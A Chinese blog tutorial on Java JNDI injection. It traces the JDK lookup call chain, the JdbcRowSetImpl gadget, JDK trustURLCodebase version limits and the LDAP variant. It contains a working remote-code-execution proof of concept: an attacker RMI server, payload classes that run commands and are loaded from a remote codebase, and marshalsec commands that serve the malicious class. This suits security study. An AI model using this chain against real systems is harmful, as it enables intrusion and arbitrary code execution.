---
title: JNDI注入原理及利用
ai: "" # 插件会自动填充
id: 1445
date: 2024-10-31 22:01:56
author: daichangya
permalink: /archives/jndizhu-ru-yuan-li-ji-li-yong/
categories:
 - java
tags: 
 - jndi
---



## 前言

本篇讲述了RMI-JNDI注入的利用原理，分析了利用流程；  
使用了marshalsec反序列化工具去简单的起一个RMI/LDAP服务端  
对于导致JNDI注入的漏洞代码扩展至com.sun.rowset.JdbcRowSetImpl函数，为fastjson反序列化起一个引子，准备新起一文。  
分析了java版本变化对于JNDI注入的影响  
引出了1.8u191之后的版本该如何利用JNDI注入，准备新起一文。  
提到了LDAP-JNDI注入

## JNDI

Java命名和目录接口（JNDI）是一种Java API，类似于一个索引中心，它允许客户端通过name发现和查找数据和对象。  
其应用场景比如：动态加载数据库配置文件，从而保持数据库代码不变动等。  
代码格式如下：

	String jndiName= ...;//指定需要查找name名称
	Context context = new InitialContext();//初始化默认环境
	DataSource ds = (DataSourse)context.lookup(jndiName);//查找该name的数据

这些对象可以存储在不同的命名或目录服务中，例如远程方法调用（RMI），通用对象请求代理体系结构（CORBA），轻型目录访问协议（LDAP）或域名服务（DNS）。（此篇中我们将着重讲解RMI，提到LDAP）

RMI格式:

	InitialContext var1 = new InitialContext();
	DataSource var2 = (DataSource)var1.lookup("rmi://127.0.0.1:1099/Exploit");

## JNDI注入

所谓的JNDI注入就是当上文代码中jndiName这个变量可控时，引发的漏洞，它将导致远程class文件加载，从而导致远程代码执行。

我们看一个利用RMI的POC，忘记从哪里收集的了。然后分析一下调用的流程。

### poc验证

ClIENT.java（受害者）

	package jndi;
	import javax.naming.Context;
	import javax.naming.InitialContext;

	public class CLIENT {

	    public static void main(String[] args) throws Exception {

		String uri = "rmi://127.0.0.1:1099/aa";
		Context ctx = new InitialContext();
		ctx.lookup(uri);

	    }

	}

SERVER.java(攻击者部署)

	package jndi;

	import com.sun.jndi.rmi.registry.ReferenceWrapper;
	import javax.naming.Reference;
	import java.rmi.registry.Registry;
	import java.rmi.registry.LocateRegistry;

	public class SERVER {

	    public static void main(String args[]) throws Exception {

		Registry registry = LocateRegistry.createRegistry(1099);
		Reference aa = new Reference("ExecTest", "ExecTest", "http://127.0.0.1:8081/");
		ReferenceWrapper refObjWrapper = new ReferenceWrapper(aa);
		System.out.println("Binding 'refObjWrapper' to 'rmi://127.0.0.1:1099/aa'");
		registry.bind("aa", refObjWrapper);

	    }

	}

ExecTest.java(攻击者部署)

	import java.io.BufferedReader;
	import java.io.IOException;
	import java.io.InputStream;
	import java.io.InputStreamReader;
	import java.io.Reader;
	import javax.print.attribute.standard.PrinterMessageFromOperator;
	public class ExecTest {
	    public ExecTest() throws IOException,InterruptedException{
		String cmd="whoami";
		final Process process = Runtime.getRuntime().exec(cmd);
		printMessage(process.getInputStream());;
		printMessage(process.getErrorStream());
		int value=process.waitFor();
		System.out.println(value);
	    }

	    private static void printMessage(final InputStream input) {
		// TODO Auto-generated method stub
		new Thread (new Runnable() {
		    @Override
		    public void run() {
		        // TODO Auto-generated method stub
		        Reader reader =new InputStreamReader(input);
		        BufferedReader bf = new BufferedReader(reader);
		        String line = null;
		        try {
		            while ((line=bf.readLine())!=null)
		            {
		                System.out.println(line);
		            }
		        }catch (IOException  e){
		            e.printStackTrace();
		        }
		    }
		}).start();
	    }
	}

编译成class文件：`javac ExecTest.java`  
部署在web服务上：`py -3 -m http.server 8081`

运行SERVER  
运行CLIENT

[![](http://ww1.sinaimg.cn/large/006iKNp3ly1g8978mkmhyj31ir1btgt8.jpg)](http://ww1.sinaimg.cn/large/006iKNp3ly1g8978mkmhyj31ir1btgt8.jpg)

> 把ExecTest.java及其编译的文件放到其他目录下，不然会在当前目录中直接找到这个类。不起web服务也会命令执行成功。  
> ExecTest.java文件不能申明包名，即package xxx。声明后编译的class文件函数名称会加上包名从而不匹配。  
> java版本小于1.8u191。之后版本存在trustCodebaseURL的限制，只信任已有的codebase地址，不再能够从指定codebase中下载字节码。

[![](http://ww1.sinaimg.cn/large/006iKNp3ly1g8979dgfh9j31ys0bt0uc.jpg)](http://ww1.sinaimg.cn/large/006iKNp3ly1g8979dgfh9j31ys0bt0uc.jpg)

### 分析调用流程

整体调用栈如下：

[![](http://ww1.sinaimg.cn/large/006iKNp3ly1g8979n598cj30vr08nq3k.jpg)](http://ww1.sinaimg.cn/large/006iKNp3ly1g8979n598cj30vr08nq3k.jpg)

`InitialContext.java`

	public Object lookup(String name) throws NamingException {
		//getURLOrDefaultInitCtx函数会分析name的协议头返回对应协议的环境对象，此处返回Context对象的子类rmiURLContext对象
		//然后在对应协议中去lookup搜索，我们进入lookup函数
		return getURLOrDefaultInitCtx(name).lookup(name);
	    }

`GenericURLContext.java`

	//var1="rmi://127.0.0.1:1099/aa"
	public Object lookup(String var1) throws NamingException {
	    //此处this为rmiURLContext类调用对应类的getRootURLContext类为解析RMI地址
	    //不同协议调用这个函数，根据之前getURLOrDefaultInitCtx(name)返回对象的类型不同，执行不同的getRootURLContext
	    //进入不同的协议路线
	    ResolveResult var2 = this.getRootURLContext(var1, this.myEnv);//获取RMI注册中心相关数据
	    Context var3 = (Context)var2.getResolvedObj();//获取注册中心对象

	    Object var4;
	    try {
		var4 = var3.lookup(var2.getRemainingName());//去注册中心调用lookup查找，我们进入此处，传入name-aa
	    } finally {
		var3.close();
	    }

	    return var4;
	}

[![](http://ww1.sinaimg.cn/large/006iKNp3ly1g897a0gnsnj31h608idh5.jpg)](http://ww1.sinaimg.cn/large/006iKNp3ly1g897a0gnsnj31h608idh5.jpg)

`RegistryContext.java`：

	//传入var1=aa
	public Object lookup(Name var1) throws NamingException {
	    if (var1.isEmpty()) {
		return new RegistryContext(this);
	    } else {//判断来到这里
		Remote var2;
		try {
		    var2 = this.registry.lookup(var1.get(0));//RMI客户端与注册中心通讯，返回RMI服务IP，地址等信息
		} catch (NotBoundException var4) {
		    throw new NameNotFoundException(var1.get(0));
		} catch (RemoteException var5) {
		    throw (NamingException)wrapRemoteException(var5).fillInStackTrace();
		}

		return this.decodeObject(var2, var1.getPrefix(1));//我们进入此处
	    }
	}

[![](http://ww1.sinaimg.cn/large/006iKNp3ly1g897a8b25uj31pw125n2b.jpg)](http://ww1.sinaimg.cn/large/006iKNp3ly1g897a8b25uj31pw125n2b.jpg)

`RegistryContext.java`：

	private Object decodeObject(Remote var1, Name var2) throws NamingException {
		try {
		    //注意到上面的服务端代码，我们在RMI服务端绑定的是一个Reference对象，世界线在这里变动
		    //如果是Reference对象会，进入var.getReference()，与RMI服务器进行一次连接，获取到远程class文件地址。
		    //如果是普通RMI对象服务，这里不会进行连接，只有在正式远程函数调用的时候才会连接RMI服务。
		    Object var3 = var1 instanceof RemoteReference ? ((RemoteReference)var1).getReference() : var1;
		    return NamingManager.getObjectInstance(var3, var2, this, this.environment);
		    //获取reference对象进入此处
		} catch (NamingException var5) {
		    throw var5;
		} catch (RemoteException var6) {
		    throw (NamingException)wrapRemoteException(var6).fillInStackTrace();
		} catch (Exception var7) {
		    NamingException var4 = new NamingException();
		    var4.setRootCause(var7);
		    throw var4;
		}
	    }
	}

[![](http://ww1.sinaimg.cn/large/006iKNp3ly1g897afb8g2j32830w8jyx.jpg)](http://ww1.sinaimg.cn/large/006iKNp3ly1g897afb8g2j32830w8jyx.jpg)

[![](http://ww1.sinaimg.cn/large/006iKNp3ly1g897akpycbj31p51200x9.jpg)](http://ww1.sinaimg.cn/large/006iKNp3ly1g897akpycbj31p51200x9.jpg)

`NamingManager.java` 截取部分有用的代码

	//传入Reference对象到refinfo
	public static Object
	    getObjectInstance(Object refInfo, Name name, Context nameCtx,
		                Hashtable<?,?> environment)
	    throws Exception
	{
		// Use builder if installed
	    ...
	    // Use reference if possible
	    Reference ref = null;
	    if (refInfo instanceof Reference) {//满足
		ref = (Reference) refInfo;//复制
	    } else if (refInfo instanceof Referenceable) {//不进入
		ref = ((Referenceable)(refInfo)).getReference();
	    }

	    Object answer;

	    if (ref != null) {//进入此处
		String f = ref.getFactoryClassName();//函数名 ExecTest
		if (f != null) {
		    //任意命令执行点1（构造函数、静态代码），进入此处
		    factory = getObjectFactoryFromReference(ref, f);
		    if (factory != null) {
		        //任意命令执行点2（覆写getObjectInstance），
		        return factory.getObjectInstance(ref, name, nameCtx,
		                                            environment);
		    }
		    return refInfo;

		} else {
		    // if reference has no factory, check for addresses
		    // containing URLs

		    answer = processURLAddrs(ref, name, nameCtx, environment);
		    if (answer != null) {
		        return answer;
		    }
		}
	    }

`NamingManager.java`

	static ObjectFactory getObjectFactoryFromReference(
	    Reference ref, String factoryName)
	    throws IllegalAccessException,
	    InstantiationException,
	    MalformedURLException {
	    Class clas = null;

	    //尝试从本地获取该class
	    try {
		    clas = helper.loadClass(factoryName);
	    } catch (ClassNotFoundException e) {
		// ignore and continue
		// e.printStackTrace();
	    }
	    //如果不在本地classpath，从cosebase中获取class
	    String codebase;
	    if (clas == null &&
		    (codebase = ref.getFactoryClassLocation()) != null) {
		//此处codebase是我们在恶意RMI服务端中定义的http://127.0.0.1:8081/
		try {
		    //从我们放置恶意class文件的web服务器中获取class文件
		    clas = helper.loadClass(factoryName, codebase);
		} catch (ClassNotFoundException e) {
		}
	    }
	    //实例化我们的恶意class文件
	    return (clas != null) ? (ObjectFactory) clas.newInstance() : null;
	}

实例化会默认调用构造方法、静态代码块。  
上面的例子就是调用了构造方法完成任意代码执行。

但是可以注意到之前执行任意命令成功，但是报错退出了，我们修改我们的恶意class文件，换一个命令执行点`factory.getObjectInstance`复写该函数执行命令。

1.  报错是因为我们的类在实例化后不能转化为ObjectFactory`(ObjectFactory) clas.newInstance()`。只需要我们的类继承该类即可。
2.  根据ObjectFactory.java的getObjectInstance接口复写函数
    
    public Object getObjectInstance(Object obj, Name name, Context nameCtx,
                                 Hashtable<?,?> environment)
     throws Exception;
    

最终第二版ExecTest如下：

	import javax.naming.Context;
	import javax.naming.Name;
	import javax.naming.spi.ObjectFactory;
	import java.io.IOException;
	import java.util.Hashtable;

	public class ExecTest implements ObjectFactory {

	    @Override
	    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) {
		exec("xterm");
		return null;
	    }

	    public static String exec(String cmd) {
		try {
		    Runtime.getRuntime().exec("calc.exe");
		} catch (IOException e) {
		    e.printStackTrace();
		}
		return "";
	    }

	    public static void main(String[] args) {
		exec("123");
	    }
	}

[![](http://ww1.sinaimg.cn/large/006iKNp3ly1g897awcgtkj31iy0x5wmt.jpg)](http://ww1.sinaimg.cn/large/006iKNp3ly1g897awcgtkj31iy0x5wmt.jpg)

> 此外，1.8编译的ExecTest.java在1.7受害者环境中也可以运行，看来简单代码，版本差距不大应该没事。

## 使用工具起rmi ldap服务

以上我们就成功复现了JNDI注入，但是在常规使用中我们自己起rmi服务器太麻烦了。  
我们使用[marshalsec反序列化工具](https://github.com/mbechler/marshalsec)起rmi、ldap服务

装有java8，使用`mvn clean package -DskipTests`编译

#rmi服务器，rmi服务起在8088 恶意class在http://ip:8080/文件夹/#ExportObject 
#不加8088端口号 默认是1099
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://ip:8080/文件夹/#ExportObject 8088

#rmi服务器，rmi服务起在8088 恶意class在http://ip:8080/文件夹/#ExportObject 
#不加8088端口号 默认是1389
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://ip:8080/文件夹/#ExportObject 8088

同时恶意class文件的web服务还需要自己去起。

## com.sun.rowset.JdbcRowSetImpl 利用链

在回到我们之前的攻击目标服务端（也就是rmi服务客户端）

目前我们利用jndi注入需要满足2个条件：  
我们需要服务端存在以下代码，uri可控

	String uri = "rmi://127.0.0.1:1099/aa";
	    Context ctx = new InitialContext();
	    ctx.lookup(uri);

并且存在漏洞版本的java环境（目前我们知道1.8u191是不可以的）

我们先来扩展第一个代码限制的问题，就有点像在commons-collection反序列化一文寻找readobject复写点一样。  
总是有很多机缘巧合。

**com.sun.rowset.JdbcRowSetImpl**类：是在fastjson反序列化漏洞中触发jndi注入的一环，此处也算是一个引子，之后将详细分析fastjson反序列化的原因。

`JdbcRowSetImpl.java`

	public void setAutoCommit(boolean var1) throws SQLException {
	    if (this.conn != null) {
		this.conn.setAutoCommit(var1);
	    } else {
		this.conn = this.connect();//进入此处
		this.conn.setAutoCommit(var1);
	    }

	}

`JdbcRowSetImpl.java`

	protected Connection connect() throws SQLException {
		if (this.conn != null) {
		    return this.conn;
		} else if (this.getDataSourceName() != null) {//我们需要一个我们可控的getDataSourceName
		    try {
		        //下面两句是完美的漏洞触发代码
		        InitialContext var1 = new InitialContext();
		        DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());//可控的jndi注入点
		        return this.getUsername() != null && !this.getUsername().equals("") ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection();
		    } catch (NamingException var3) {
		        throw new SQLException(this.resBundle.handleGetObject("jdbcrowsetimpl.connect").toString());
		    }
		} else {
		    return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null;
		}
	    }

最后需要**this.getDataSourceName()**的赋值处：  
`JdbcRowSetImpl.java`

	public void setDataSourceName(String var1) throws SQLException {//var1可控
	    if (this.getDataSourceName() != null) {
		if (!this.getDataSourceName().equals(var1)) {
		    String var2 = this.getDataSourceName();
		    super.setDataSourceName(var1);
		    this.conn = null;
		    this.ps = null;
		    this.rs = null;
		    this.propertyChangeSupport.firePropertyChange("dataSourceName", var2, var1);
		}
	    } else {
		super.setDataSourceName(var1);//赋值setDataSourceName
		this.propertyChangeSupport.firePropertyChange("dataSourceName", (Object)null, var1);
	    }

所以客户端的POC如下（即受害者执行以下代码就可以触发漏洞）

	package jndi;

	import com.sun.rowset.JdbcRowSetImpl;

	public class CLIENT {

	    public static void main(String[] args) throws Exception {
		JdbcRowSetImpl JdbcRowSetImpl_inc = new JdbcRowSetImpl();//只是为了方便调用
		JdbcRowSetImpl_inc.setDataSourceName("rmi://127.0.0.1:1099/aa");
		JdbcRowSetImpl_inc.setAutoCommit(true);
	    }
	}

用工具来起rmi服务端

`java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:8090/#ExecTest`

然后用python起ExecTest.class的web（此处用的是上文的第二种payload）

`py -3 -m http.server 8090`

[![](http://ww1.sinaimg.cn/large/006iKNp3ly1g897bvch2cj326b185e0e.jpg)](http://ww1.sinaimg.cn/large/006iKNp3ly1g897bvch2cj326b185e0e.jpg)

至于该如何让JdbcRowSetImpl_inc执行在受害者机器上，那就是反序列化利用链一样地衍生了，这边只是衍生出第一步说明，JNDI注入并不是一定要存在一个web服务对外，一定要有一个`ctx.lookup(uri)`的url参数可控，才能形成漏洞。

漏洞利用要考虑java环境、组件，不要跟SQL注入一样认为都是定死的。具体就结合fastjson再议了。

## RMI+LDAP注入java版本限制

我们再回到第二个版本限制问题：

JDNI注入由于其加载动态类原理是JNDI Reference远程加载Object Factory类的特性（使用的不是RMI Class Loading,而是URLClassLoader）。

所以不受RMI动态加载恶意类的 **java版本应低于7u21、6u45，或者需要设置java.rmi.server.useCodebaseOnly=false系统属性**的限制。具有更多的利用空间

但是我们之前实验还是有版本无法复现，是因为在JDK 6u132, JDK 7u122, JDK 8u113版本中，**系统属性 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为false**，即默认不允许从远程的Codebase加载Reference工厂类。（这也是我们之前1.8u191失败的原因）

之前也提到jndi注入远程对象读取不单单只可以从rmi服务中读取，还可以从LDAP服务中读取

LDAP服务的Reference远程加载Factory类**不受com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制**，所以适用范围更广。

不过在2018年10月，Java最终也修复了这个利用点，对LDAP Reference远程工厂类的加载增加了限制，  
在Oracle JDK 11.0.1、8u191、7u201、6u211之后 **com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值被调整为false**。

[![](http://ww1.sinaimg.cn/large/006iKNp3ly1g89d6g04jvj317r0h70ua.jpg)](http://ww1.sinaimg.cn/large/006iKNp3ly1g89d6g04jvj317r0h70ua.jpg)

至于1.8u191之后咋办，我们新起一篇来讲述把；还是先来看一下可以绕过更多版本限制的LDAP+JNDI注入的利用方式

## LDAP+JNDI

### LDAP

LDAP（Lightweight Directory Access Protocol）-轻量目录访问协议。但看了这个解释等于没说，其实也就是一个数据库，可以把它与mysql对比！  
具有以下特点：

1.  基于TCP/IP协议
2.  同样也是分成服务端/客户端；同样也是服务端存储数据，客户端与服务端连接进行操作
3.  相对于mysql的表型存储；不同的是LDAP使用**树型**存储
    1.  因为树型存储，读性能佳，写性能差，没有事务处理、回滚功能。

树层次分为以下几层：

*   dn：一条记录的详细位置，由以下几种属性组成
*   dc: 一条记录所属区域（哪一个树，相当于MYSQL的数据库）
*   ou：一条记录所处的分叉（哪一个分支，支持多个ou，代表分支后的分支）
*   cn/uid：一条记录的名字/ID（树的叶节点的编号，想到与MYSQL的表主键？）

举个例子一条记录就是  
dn="uid=songtao.xu,ou=oa,dc=example,dc=com"

### POC

其实利用方法是没差的，我们之前分析的时候也可以看到代码会根据传入协议头的区别去进入对应的处理函数，只需要修改传入参数的解析头,再启动ldap服务，恶意class的web服务即可。

我们重点关注版本问题，我们在1.8u161版本(RMI+JNDI不行、LDAP+JNDI可以的版本)下去使用ldap+jndi注入

POC

	package jndi;
	import javax.naming.Context;
	import javax.naming.InitialContext;
	import javax.swing.*;

	public class CLIENT {

	    public static void main(String[] args) throws Exception {
		String uri = "ldap://127.0.0.1:1389/aa";
	//        String uri = "rmi://127.0.0.1:1099/aa";
		Context ctx = new InitialContext();
		ctx.lookup(uri);
	    }
	}

服务端一样用工具起来，不赘述。

[![](http://ww1.sinaimg.cn/large/006iKNp3ly1g897c3ew1cj31bq10pqhr.jpg)](http://ww1.sinaimg.cn/large/006iKNp3ly1g897c3ew1cj31bq10pqhr.jpg)

[![](http://ww1.sinaimg.cn/large/006iKNp3ly1g897cf4q73j31yi0vp430.jpg)](http://ww1.sinaimg.cn/large/006iKNp3ly1g897cf4q73j31yi0vp430.jpg)

结果没毛病

## 小结

分析一通，小结就是以后渗透测试要用ldap-JNDI注入，命中率更高。

# 参考

[https://www.freebuf.com/vuls/115849.html](https://www.freebuf.com/vuls/115849.html)  
[https://www.veracode.com/blog/research/exploiting-jndi-injections-java](https://www.veracode.com/blog/research/exploiting-jndi-injections-java)  
[https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html](https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html)  
RPC  
[https://www.jianshu.com/p/2accc2840a1b](https://www.jianshu.com/p/2accc2840a1b)  
[https://www.freebuf.com/column/189835.html](https://www.freebuf.com/column/189835.html)  
ldap  
[https://www.cnblogs.com/wilburxu/p/9174353.html](https://www.cnblogs.com/wilburxu/p/9174353.html)  
[https://www.jianshu.com/p/7e4d99f6baaf](https://www.jianshu.com/p/7e4d99f6baaf)  
[https://blog.csdn.net/caoyujiao520/article/details/82762097](https://blog.csdn.net/caoyujiao520/article/details/82762097)

